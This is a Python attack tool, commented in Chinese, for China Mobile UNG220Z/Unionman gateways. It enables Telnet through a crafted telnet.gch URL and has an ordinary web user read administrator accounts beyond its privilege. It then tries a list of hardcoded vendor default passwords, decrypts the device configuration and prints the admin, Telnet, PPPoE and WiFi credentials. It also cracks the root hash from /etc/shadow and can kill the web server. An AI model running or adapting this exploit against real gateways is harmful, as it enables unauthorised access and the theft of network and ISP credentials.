#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ung220z.py —— UNG220Z / Unionman 中国移动网关 凭据提取工具

流程
  1. 询问网关地址、普通账户、密码
  2. 补全 http://<ip>/usr=<user>&psw=<pass>&cmd=1&telnet.gch 并发送给浏览器，开启 Telnet
  3. 走 Telnet 通道登录（全程不建立 Web 会话，避免把管理页锁死）
  4. 解密配置库，提取全部凭据
  5. 按 [HH:MM:SS] TAG 格式打印日志，并落盘

用法
  python3 ung220z.py
  python3 ung220z.py -i 192.168.1.1 -u user -p 'xxxx' --no-browser
"""
import argparse
import base64
import getpass
import html as html_mod
import http.cookiejar
import os
import random
import re
import select
import socket
import subprocess
import sys
import time
import unicodedata
import urllib.error
import urllib.parse
import urllib.request
import webbrowser

IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240
TELNET_USER = "CMCCAdmin"
TELNET_PW = ""   # 留空则只用你输入的密码尝试，或用 --telnet-password 指定
CFG_ENC = "/userconfig/cfg/db_user_cfg.xml"
CFG_DEC = "/tmp/debug-decry-cfg"
PLACEHOLDER_PSK = "!@#$%12345"

_logfh = None


def log(tag, msg):
    line = "[%s] %-6s %s" % (time.strftime("%H:%M:%S"), tag, msg)
    print(line, flush=True)
    if _logfh:
        _logfh.write(line + "\n")
        _logfh.flush()


def dwidth(s):
    return sum(2 if unicodedata.east_asian_width(c) in "WF" else 1 for c in s)


def pad(s, width):
    return s + " " * max(0, width - dwidth(s))


# ─────────────────────────────── HTTP ───────────────────────────────
_CHARSET_RE = re.compile(r"charset=([A-Za-z0-9_-]+)", re.I)


def _decode(raw, ctype=""):
    """光猫页面常为 GBK：先按响应头 charset，再 utf-8 → gbk → gb18030 回退。"""
    encs = []
    m = _CHARSET_RE.search(ctype or "")
    if m:
        encs.append(m.group(1))
    encs += ["utf-8", "gbk", "gb18030"]
    for enc in encs:
        try:
            return raw.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return raw.decode("utf-8", "replace")


def http_get(url, timeout=8):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 Chrome/120"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return _decode(r.read(), r.headers.get("Content-Type", ""))
    except urllib.error.HTTPError as e:
        # 部分固件用 4xx 返回正常页面，body 依然有效
        return _decode(e.read() or b"", (e.headers or {}).get("Content-Type", ""))


def http_post(url, data, timeout=8):
    req = urllib.request.Request(url, data=data.encode(),
                                 headers={"User-Agent": "Mozilla/5.0 Chrome/120",
                                          "Referer": url})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, _decode(r.read(), r.headers.get("Content-Type", ""))
    except urllib.error.HTTPError as e:
        return e.code, _decode(e.read() or b"", (e.headers or {}).get("Content-Type", ""))


def probe_port(ip, port, timeout=3):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        return True
    except Exception:
        return False
    finally:
        s.close()


def release_session(ip):
    """POST setlang.gch logout=1，释放可能残留的单会话锁。"""
    try:
        st, body = http_post("http://%s/setlang.gch" % ip, "logout=1")
        return st == 200
    except Exception:
        return False


def web_state(ip):
    """ok / busy / down"""
    try:
        body = http_get("http://%s/" % ip, timeout=6)
    except Exception:
        return "down"
    if "其他用户" in body:
        return "busy"
    return "ok"


def unlock_web(ip, tn):
    """kill httpd 清掉单会话锁，父进程 pc 会自动拉起。"""
    pid = None
    for ln in tn.run("ps").splitlines():
        if "httpd" in ln:
            pid = ln.split()[0]
            break
    if not pid:
        log("WARN", "未找到 httpd 进程")
        return False
    log("WARN", "检测到会话锁，重启 httpd (pid %s)" % pid)
    tn.run("kill %s" % pid)
    for _ in range(12):
        time.sleep(1)
        st = web_state(ip)
        if st != "down":
            log("INFO", "httpd 已恢复，Web 状态 → %s" % st)
            return st == "ok"
    return False


def enable_telnet(ip, user, pw, open_browser=True, timeout=8):
    base = "http://%s/" % ip
    # 口令里的 % & # ? + 空格 必须先百分号编码，否则服务器会返回 400 Bad Request
    # （社区实测：aDm8H%MdA 必须写成 aDm8H%25MdA）
    quoted = "%susr=%s&psw=%s&cmd=1&telnet.gch" % (
        base, urllib.parse.quote(user, safe=""), urllib.parse.quote(pw, safe=""))
    raw = "%susr=%s&psw=%s&cmd=1&telnet.gch" % (base, user, pw)
    risky = any(c in (user + pw) for c in "%&#?+ ")
    variants = [quoted, raw] if risky else [raw, quoted]
    variants.append("%s?usr=%s&psw=%s&cmd=1&telnet.gch" % (
        base, urllib.parse.quote(user, safe=""), urllib.parse.quote(pw, safe="")))
    if open_browser:
        try:
            opened = webbrowser.open(variants[0])
            log("HTTP", "已发送给浏览器%s: http://%s/usr=%s&psw=***&cmd=1&telnet.gch"
                % ("" if opened else "（无可用浏览器，改由脚本直连）", ip, user))
        except Exception as e:
            log("WARN", "浏览器调用失败: %s" % e)
    missing = False
    for url in variants:
        try:
            body = http_get(url, timeout=timeout)
        except urllib.error.HTTPError as e:
            if e.code == 404:
                missing = True
                log("WARN", "telnet.gch 请求失败: HTTP 404（该固件没有这个接口）")
            else:
                log("WARN", "telnet.gch 请求失败: HTTP %d" % e.code)
            continue
        except Exception as e:
            log("WARN", "telnet.gch 请求失败: %s" % e)
            continue
        if "Success" in body:
            log("HTTP", "telnet.gch → TelnetSet Success!")
            return True
        if "get_factory_mode" in body:
            log("HTTP", "telnet.gch → 返回了中兴工厂模式页面")
            log("HINT", "该设备支持工厂模式：python3 -m ontkit zte -H %s -p 8080 --mode factory" % ip)
            continue
        txt = re.sub(r"<[^>]+>", " ", body).strip()
        log("HTTP", "telnet.gch → %s" % (txt[:60] if txt else "空响应"))
    if missing:
        log("HINT", "404 说明这不是九联/吉比特的 .gch 固件，本脚本的开启方式不适用")
    return False


MARKERS = [
    ("getpage.gch", "中兴 .gch 系"),
    ("frm_logintoken", "中兴 .gch 系"),
    ("get_factory_mode", "中兴工厂模式页"),
    ("ssmp", "华为 ssmp 系"),
    ("boaform", "GoAhead（九联 UNG 系列）"),
    ("mini web server", "通用 Mini web server"),
    ("webcmcc", "移动 WebCMCC 定制页"),
]


def fingerprint(ip):
    """探测 Web 指纹，返回命中的家族标记列表。"""
    try:
        req = urllib.request.Request("http://%s/" % ip,
                                     headers={"User-Agent": "Mozilla/5.0 Chrome/120"})
        with urllib.request.urlopen(req, timeout=6) as r:
            server = r.headers.get("Server", "-")
            body = _decode(r.read(), r.headers.get("Content-Type", ""))
        title = re.search(r"<title>([^<]*)</title>", body, re.I)
        low = body.lower()
        hits = [name for key, name in MARKERS if key in low]
        log("DATA", "指纹 Server=%s  title=%s  特征=%s"
            % (server, title.group(1) if title else "-", " / ".join(hits) or "未识别"))
        return hits
    except Exception as e:
        log("WARN", "指纹获取失败: %s" % e)
        return []


def suggest_from_fingerprint(hits, ip):
    """根据指纹给出下一步建议。"""
    text = " ".join(hits)
    if "中兴工厂模式" in text or "中兴" in text:
        log("HINT", "该设备疑似中兴方案，试试工厂模式开 Telnet：")
        log("HINT", "  python3 -m ontkit zte -H %s -p 8080 --mode factory" % ip)
    elif "华为" in text:
        log("HINT", "该设备是华为 ssmp 方案：")
        log("HINT", "  python3 -m ontkit huawei -H %s" % ip)
    elif "GoAhead" in text:
        log("HINT", "GoAhead 方案可试前端接口开 Telnet（浏览器控制台执行）：")
        log("HINT", "  sendRequest('/boaform/set_telnet_enabled_url',{telnet_lan_enabled:'1'})")
    else:
        log("HINT", "未识别出固件家族，可用 ontkit probe 进一步探测：")
        log("HINT", "  python3 -m ontkit probe -H %s" % ip)


# ─────────────────────────────── Telnet ───────────────────────────────
def _parse(buf):
    out, rep, i = bytearray(), bytearray(), 0
    while i < len(buf):
        b = buf[i]
        if b == IAC and i + 1 < len(buf):
            cmd = buf[i + 1]
            if cmd == IAC:          # 0xFF 转义，输出一个真实的 0xFF
                out.append(IAC)
                i += 2
                continue
            if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(buf):
                rep += bytes([IAC, WONT if cmd == DO else DONT, buf[i + 2]])
                i += 3
                continue
            if cmd == SB:
                j = buf.find(bytes([IAC, SE]), i + 2)
                i = (j + 2) if j != -1 else len(buf)
                continue
            i += 2
            continue
        out.append(b)
        i += 1
    return bytes(out).decode("utf-8", "replace"), bytes(rep)


class Telnet:
    def __init__(self, ip, port=23, timeout=8):
        self.s = socket.create_connection((ip, port), timeout=timeout)
        self.s.setblocking(False)
        self.buf = ""

    def _recv(self, timeout):
        r, _, _ = select.select([self.s], [], [], timeout)
        if not r:
            return False
        try:
            data = self.s.recv(8192)
        except BlockingIOError:
            return False
        if not data:
            return False
        txt, rep = _parse(data)
        if rep:
            self.s.sendall(rep)
        self.buf += txt
        return True

    def read_until(self, token, timeout=10):
        end = time.time() + timeout
        while time.time() < end:
            if token in self.buf:
                return self.buf
            self._recv(0.3)
        return self.buf

    def read_until_any(self, tokens, timeout=10):
        end = time.time() + timeout
        while time.time() < end:
            for t in tokens:
                if t in self.buf:
                    return t
            self._recv(0.3)
        return None

    def send(self, line):
        self.s.sendall(line.encode() + b"\r\n")

    def login(self, user, passwords):
        self.read_until_any(["Login:", "login:", "Username:"], 8)
        for pw in passwords:
            self.buf = ""
            self.send(user)
            got = self.read_until_any(["Password:", "password:", "incorrect", "Login:"], 8)
            if got not in ("Password:", "password:"):
                log("AUTH", "Telnet 用户名 %s 不可用" % user)
                return False
            self.buf = ""
            self.send(pw)
            got = self.read_until_any(["/ #", "# ", "$ ", "incorrect", "Login:"], 10)
            if got in ("/ #", "# ", "$ "):
                log("AUTH", "Telnet %s / *** → 登录成功" % user)
                return True
            log("AUTH", "Telnet %s / *** → 拒绝" % user)
        return False

    def run(self, cmd, timeout=15):
        """执行命令并回收输出；用随机 marker 定界，避免内容里恰好出现固定串。"""
        self.buf = ""
        tag = "__X%08x__" % random.getrandbits(32)
        self.send(cmd)
        time.sleep(0.35)
        self.send("echo %s" % tag)
        out = self.read_until(tag, timeout).split(tag)[0]
        cmdline = cmd.strip()
        lines = []
        for ln in out.splitlines():
            s = ln.strip()
            if not s or s.startswith("/ #") or s.startswith("# ") or s.startswith("$ "):
                continue
            if s == cmdline or (s.startswith("echo ") and tag in s):
                continue
            lines.append(ln.rstrip())
        return "\n".join(lines).strip()

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


# ─────────────────────────────── 配置解析 ───────────────────────────────
class Cfg:
    r"""解密后的配置库：整份只 cat 一次，本地按 <Tbl> 切表。

    `sed -n '/<Tbl name="X"/,/<\/Tbl>/p'` 要求首尾标记分行；配置被压成单行时
    整份文档会被当成一张表返回，PPPoE/WiFi 行就会串进 Web 账号里。
    """

    def __init__(self, tn, timeout=90):
        self.tn = tn
        self.timeout = timeout
        self._raw = None

    def raw(self):
        if self._raw is None:
            expect = 0
            m = re.search(r"(\d+)", self.tn.run("wc -c %s" % CFG_DEC, timeout=self.timeout))
            if m:
                expect = int(m.group(1))
            self._raw = self.tn.run("cat %s" % CFG_DEC, timeout=self.timeout)
            if expect and len(self._raw) < expect * 0.9:
                log("WARN", "配置可能被截断（期望 %d 字节，实收 %d）" % (expect, len(self._raw)))
        return self._raw

    def table(self, name):
        m = re.search(r'<Tbl name="%s"[^>]*>(.*?)</Tbl>' % re.escape(name), self.raw(), re.S)
        return m.group(1) if m else ""

    def rows(self, name):
        return parse_rows(self.table(name))

    def scalar(self, key):
        m = re.search(r'<DM name="%s" val="([^"]*)"' % re.escape(key), self.raw())
        return m.group(1) if m else None


def parse_rows(text):
    rows = []
    for blk in re.findall(r'<Row No="\d+">(.*?)</Row>', text, re.S):
        rows.append(dict(re.findall(r'<DM name="([A-Za-z_0-9]+)" val="([^"]*)"', blk)))
    return rows


def crack_root(hashed, candidates):
    algo = "-5" if hashed.startswith("$5$") else "-6"
    salt = hashed.split("$")[2] if hashed.count("$") >= 3 else ""
    for pw in candidates:
        try:
            out = subprocess.run(["openssl", "passwd", algo, "-salt", salt, pw],
                                 capture_output=True, text=True, timeout=5).stdout.strip()
        except FileNotFoundError:
            log("WARN", "未找到 openssl，跳过 root 口令比对")
            return None
        except Exception as e:
            log("WARN", "口令比对出错：%s" % e)
            return None
        if out == hashed:
            return pw
    return None



# ─────────────────── Web 侧侦察（读 Telnet 口令） ───────────────────
DEFAULT_CREDS = [
    ("useradmin", "useradmin"),        # 九联 UNG/UNP 系列实测默认值
    ("CMCCAdmin", "aDm8H%MdA"),
    ("CMCCAdmin", "UM@Pon521"),
    ("telecomadmin", "nE7jA%5m"),
    ("root", "adminHW"),
    ("root", "Zte521"),
    ("admin", "admin"),
    ("user", "user"),
]


def js_unescape(v):
    v = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), v)
    return html_mod.unescape(v)


def parse_values(body):
    return {k: js_unescape(v)
            for k, v in re.findall(r"Transfer_meaning\('([A-Za-z_0-9]+)','((?:[^'\\]|\\.)*)'\)", body)
            if v and not k.startswith("IF_")}


class WebSession:
    """带 Cookie 的 Web 会话，处理 Frm_Logintoken 递增。"""

    def __init__(self, ip):
        self.base = "http://%s/" % ip
        self.cj = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cj))
        self.op.addheaders = [("User-Agent", "Mozilla/5.0 Chrome/120"), ("Referer", self.base)]

    def get(self, path, timeout=8):
        try:
            with self.op.open(self.base + path, timeout=timeout) as r:
                return _decode(r.read(), r.headers.get("Content-Type", ""))
        except urllib.error.HTTPError as e:
            return _decode(e.read() or b"", (e.headers or {}).get("Content-Type", ""))

    def post_form(self, path, data, timeout=8):
        body = urllib.parse.urlencode(data).encode()
        try:
            with self.op.open(urllib.request.Request(self.base + path, data=body),
                              timeout=timeout) as r:
                return _decode(r.read(), r.headers.get("Content-Type", ""))
        except urllib.error.HTTPError as e:
            return _decode(e.read() or b"", (e.headers or {}).get("Content-Type", ""))

    def login(self, user, pw):
        page = self.get("")
        m = re.search(r'Frm_Logintoken"\)\.value\s*=\s*"(\d+)"', page)
        token = m.group(1) if m else "7"
        body = self.post_form("", {
            "username": user,
            "logincode": base64.b64encode(pw.encode()).decode(),
            "textpwd": "", "frashnum": "", "ieversion": "1",
            "Frm_Logintoken": token, "action": "login",
        })
        return 'name="logincode"' not in body and len(body) > 5000

    def page(self, name):
        body = self.get("getpage.gch?pid=1002&nextpage=" + name)
        return "" if "页面超时" in body else body


def web_recon(ip, user, pw):
    """用普通账号登录 Web，越权读管理员行并取 telnet 口令。"""
    out = []
    log("INFO", "Web 侧侦察：账号表 + Telnet 配置")
    try:
        s = WebSession(ip)
        if not s.login(user, pw):
            log("WARN", "Web 侦察跳过：登录失败")
            return out

        found = {}
        bodies = [s.page("manager_aduser_conf_t.gch")] + \
                 [s.page("manager_aduser_conf_t.gch&IF_INDEX=%d" % i) for i in range(4)]
        for idx, body in enumerate(bodies):
            vals = parse_values(body)
            u = vals.get("Username")
            if not u:
                continue
            p = vals.get("InitialPassword") or vals.get("Password")
            log("DATA", "账号[%d] %-12s %-16s Right=%s" % (idx, u, p, vals.get("Right")))
            if p and p != "******":
                found[u] = p

        for u, p in found.items():
            try:
                if u != user and not s.login(u, p):
                    continue
                vals = parse_values(s.page("tele_sec_tserver_t.gch"))
                tu, tp = vals.get("TS_UName"), vals.get("TS_UPwd")
                if tp:
                    log("DATA", "Telnet 配置 %s / %s" % (tu or u, tp))
                    out.append((tu or u, tp))
            except Exception as e:
                log("WARN", "读 Telnet 配置失败: %s" % e)
    except Exception as e:
        log("WARN", "Web 侦察异常: %s" % e)
    return out


def telnet_any(ip, pairs, port=23, timeout=8):
    """按 (账号, 口令) 顺序尝试，命中即返回会话。"""
    tried = set()
    for u, p in pairs:
        if not u or not p or (u, p) in tried:
            continue
        tried.add((u, p))
        try:
            tn = Telnet(ip, port=port, timeout=timeout)
        except Exception as e:
            log("WARN", "Telnet 连接失败: %s" % e)
            return None
        if tn.login(u, [p]):
            log("AUTH", "Telnet %s / %s → 登录成功" % (u, p))
            return tn
        log("AUTH", "Telnet %s / %s → 拒绝" % (u, p))
        tn.close()
        time.sleep(0.3)
    return None


# ─────────────────────────────── 主流程 ───────────────────────────────


def main():
    global _logfh
    ap = argparse.ArgumentParser(description="UNG220Z 凭据提取")
    ap.add_argument("-i", "--ip", default=None, help="光猫地址，默认 192.168.1.1")
    ap.add_argument("-u", "--user", default=None, help="登录用户名，默认 user")
    ap.add_argument("-p", "--password", default=None, help="登录密码（不填则交互输入）")
    ap.add_argument("--no-browser", action="store_true", help="不调用浏览器，直接 HTTP 请求")
    ap.add_argument("--no-release", action="store_true", help="不尝试释放残留 Web 会话")
    ap.add_argument("--telnet-user", default=TELNET_USER, help="Telnet 用户名，默认 CMCCAdmin")
    ap.add_argument("--telnet-password", default=None, help="Telnet 口令（部分机型与 Web 口令不同）")
    ap.add_argument("--telnet-port", type=int, default=23, help="Telnet 端口，默认 23")
    ap.add_argument("--timeout", type=float, default=8.0, help="网络超时秒数，默认 8")
    ap.add_argument("--unlock", action="store_true", help="Web 被会话锁占住时，重启 httpd 解锁")
    a = ap.parse_args()

    logfile = "ung220z_%s.log" % time.strftime("%Y%m%d_%H%M%S")
    try:
        _logfh = open(logfile, "w", encoding="utf-8")
        try:
            os.chmod(logfile, 0o600)
        except OSError:
            pass
    except OSError:
        _logfh = None
        print("提示：当前目录不可写，日志只输出到屏幕")

    tn = None
    try:
        # ── 交互提示：先说用户名，再说密码 ──
        print()
        print("  ※ 用户名和密码通常印在光猫【背面贴纸】上（S/N 标签）")
        print("    形如「用户名：user   密码：xxxxxxxx」，把光猫翻过来就能看到")
        print(flush=True)

        ip = (a.ip or "").strip() or input("① 光猫地址 [192.168.1.1]: ").strip() or "192.168.1.1"
        user = (a.user or "").strip() or input("② 用户名 [user]: ").strip() or "user"

        if a.password:
            pw = a.password.rstrip("\r\n")          # 首尾空格可能是口令的一部分
        else:
            print("③ 密码（输入时不显示）", flush=True)
            if sys.stdin.isatty():
                pw = getpass.getpass("   密码: ").rstrip("\r\n")
            else:
                pw = input("   密码: ").rstrip("\r\n")

        if not pw:
            log("WARN", "密码为空，退出")
            print("\n没有输入密码，已退出。密码印在光猫背面的贴纸上。")
            return 1

        log("INFO", "会话开始  目标=%s  账户=%s" % (ip, user))
        log("INFO", "日志文件 %s" % os.path.abspath(logfile))

        if not probe_port(ip, 80, a.timeout):
            log("PROBE", "TCP 80/%s → closed" % ip)
            log("WARN", "网关不可达，检查地址与网络")
            return 2
        log("PROBE", "TCP 80/%s → open" % ip)

        if not a.no_release:
            log("INFO", "释放残留 Web 会话 → %s" % ("ok" if release_session(ip) else "skip"))

        log("INFO", "补全 URL: http://%s/usr=%s&psw=***&cmd=1&telnet.gch" % (ip, user))
        opened = enable_telnet(ip, user, pw, open_browser=not a.no_browser, timeout=a.timeout)

        if not probe_port(ip, a.telnet_port, a.timeout):
            log("PROBE", "TCP %d/%s → closed" % (a.telnet_port, ip))
            log("WARN", "Telnet 端口未开放，无法继续")
            if not opened:
                log("INFO", "开始识别固件类型 …")
                suggest_from_fingerprint(fingerprint(ip), ip)
                log("HINT", "该固件的 telnet 开启方式可能与本脚本不同")
            else:
                log("HINT", "telnet.gch 已返回 Success 但端口未监听：确认设备没禁用 Telnet 服务")
            return 3
        log("PROBE", "TCP %d/%s → open" % (a.telnet_port, ip))

        # ── Telnet 登录：多账号多口令，逐级升级 ──
        pairs = [(user, pw)]                                  # ① 你填的账号本人
        if a.telnet_user and a.telnet_user != user:
            pairs.append((a.telnet_user, pw))                 # ② CMCCAdmin + 同一口令
        if a.telnet_password:
            pairs.append((a.telnet_user, a.telnet_password))  # ③ 命令行指定
        pairs += web_recon(ip, user, pw)                      # ④ Web 侧侦察
        pairs += DEFAULT_CREDS                                # ⑤ 出厂默认组合

        tn = telnet_any(ip, pairs, port=a.telnet_port, timeout=a.timeout)
        if not tn:
            log("WARN", "Telnet 登录失败：所有候选账号/口令均被拒绝")
            log("HINT", "浏览器用超管登录后打开下面这个地址可看到 Telnet 口令：")
            log("HINT", "  http://%s/getpage.gch?pid=1002&nextpage=tele_sec_tserver_t.gch" % ip)
            return 4

        st = web_state(ip)
        log("PROBE", "Web 状态 → %s" % st)
        if st == "busy" and a.unlock:
            unlock_web(ip, tn)

        log("SHELL", "id → %s" % tn.run("id", timeout=a.timeout))
        log("SHELL", "uname -a → %s" % tn.run("uname -a", timeout=a.timeout))
        log("INFO", "Web 会话全程未占用（避免管理页被锁）")

        dec = tn.run("sidbg 1 DB decry %s" % CFG_ENC, timeout=max(20.0, a.timeout * 3))
        # ls 的报错同样落在 pty 上，非空输出不能代表文件存在
        mark = tn.run("test -s %s && echo __OK__ || echo __NO__" % CFG_DEC, timeout=a.timeout)
        if "__OK__" not in mark:
            log("WARN", "配置解密失败（sidbg 返回: %s）" % (dec[:80] or "空"))
            log("HINT", "九联/中兴方案的配置也可能在 /config/work/lastgood.xml（加密）")
            log("HINT", "解密工具：https://github.com/joestar817/decrypt-lastgood")
            return 5
        log("SHELL", "sidbg 1 DB decry %s → %s" % (CFG_ENC, CFG_DEC))

        cfg = Cfg(tn, timeout=max(90.0, a.timeout * 6))
        creds, wifi = {}, []

        for r in cfg.rows("DevAuthInfo"):
            lvl = r.get("Level")
            log("DATA", "DevAuthInfo  %-10s / %-18s  Level=%s" % (r.get("User"), r.get("Pass"), lvl))
            creds["web_admin" if lvl == "1" else "web_user"] = (r.get("User"), r.get("Pass"))

        for r in cfg.rows("TelnetUser"):
            log("DATA", "TelnetUser   %-10s / %-18s  Type=%s"
                % (r.get("Username"), r.get("Password"), r.get("Type")))

        ts_pw = cfg.scalar("TS_UPwd")
        if ts_pw:
            log("DATA", "TS_UPwd      %s / %s（实际 Telnet 口令）" % (TELNET_USER, ts_pw))
            creds["telnet"] = (TELNET_USER, ts_pw)

        for r in cfg.rows("WANCPPP"):
            if r.get("UserName"):
                log("DATA", "WANCPPP      %s / %s" % (r["UserName"], r.get("Password")))
                creds["pppoe"] = (r["UserName"], r.get("Password"))

        essid = {}
        for r in cfg.rows("WLANCfg"):
            if r.get("ESSID"):
                essid[r.get("ViewName", "")] = r["ESSID"]
        for r in cfg.rows("WLANPSK"):
            psk = r.get("KeyPassphrase")
            if not psk:
                continue
            vn = r.get("ViewName", "")
            ssid = essid.get(vn.rsplit(".PSK", 1)[0], vn)
            log("DATA", "WLANPSK      %-22s SSID=%-14s PSK=%s" % (vn, ssid, psk))
            wifi.append((ssid, psk))

        shadow = tn.run("grep root /etc/shadow | head -1", timeout=a.timeout)
        m = re.search(r"root:(\$[0-9]\$[^:]+):", shadow)
        if m:
            root_pw = crack_root(m.group(1), ["aDm8H%MdA", "admin", "root", "123456", "CMCCAdmin"])
            if root_pw:
                log("CRACK", "MATCH: %s  (/etc/shadow)" % root_pw)
                creds["root"] = ("root", root_pw)
            else:
                log("DATA", "root 哈希 %s…（常见口令未命中）" % m.group(1)[:32])
                creds["root"] = ("root", m.group(1))

        # ── 汇总 ──
        print("\n" + "═" * 66)
        print(" 凭据汇总    %s" % ip)
        print("═" * 66)
        labels = [("telnet", "Telnet / root shell"), ("web_admin", "Web 超管"),
                  ("web_user", "Web 普通用户"), ("pppoe", "PPPoE 宽带"), ("root", "Linux root")]
        for key, lab in labels:
            if key in creds:
                u, p = creds[key]
                print("  %s %s %s" % (pad(lab, 22), pad(u, 14), p))
        for ssid, psk in wifi:
            note = "  (出厂占位)" if psk == PLACEHOLDER_PSK else ""
            print("  %s %s %s%s" % (pad("WiFi " + ssid, 22), pad("", 14), psk, note))
        print("═" * 66)
        log("INFO", "完成。口令每 15 分钟轮换，重跑本脚本即可取新值")
        return 0

    except KeyboardInterrupt:
        log("WARN", "用户中断")
        return 130
    except Exception as e:
        log("WARN", "%s: %s" % (e.__class__.__name__, e))
        return 1
    finally:
        if tn is not None:
            try:
                # 设备上不留明文配置（内含全部口令）
                tn.run("rm -f %s" % CFG_DEC, timeout=a.timeout)
                log("INFO", "已清理设备侧 %s" % CFG_DEC)
            except Exception:
                pass
            tn.close()
        if _logfh:
            _logfh.close()
            _logfh = None


if __name__ == "__main__":
    sys.exit(main())
